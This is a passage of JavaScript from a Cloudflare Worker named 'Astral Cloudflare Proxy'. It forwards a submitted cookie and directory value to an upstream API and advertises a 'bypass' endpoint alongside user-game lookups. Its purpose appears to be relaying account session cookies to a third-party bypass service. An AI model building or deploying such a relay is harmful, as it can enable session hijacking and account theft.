          body: new URLSearchParams({ cookie, directory })
        });

        const data = await response.json();
        return new Response(JSON.stringify(data), {
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      } catch (error) {
        return new Response(JSON.stringify({
          success: false,
          title: 'Proxy Error',
          description: error.message || 'Failed to proxy request'
        }), {
          status: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
    }

    // ---- Default ----
    return new Response(JSON.stringify({
      service: 'Astral Cloudflare Proxy',
      endpoints: {
        '/': 'HTML Frontend',
        '/bypass/astral/bypass.php': 'POST - Main bypass endpoint',
        '/played?userId=ID': 'GET - Played games top 3',
        '/proxy': 'POST - Proxy to original API',
        '/health': 'GET - Health check'
      },
      status: 'operational'
    }), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }
};
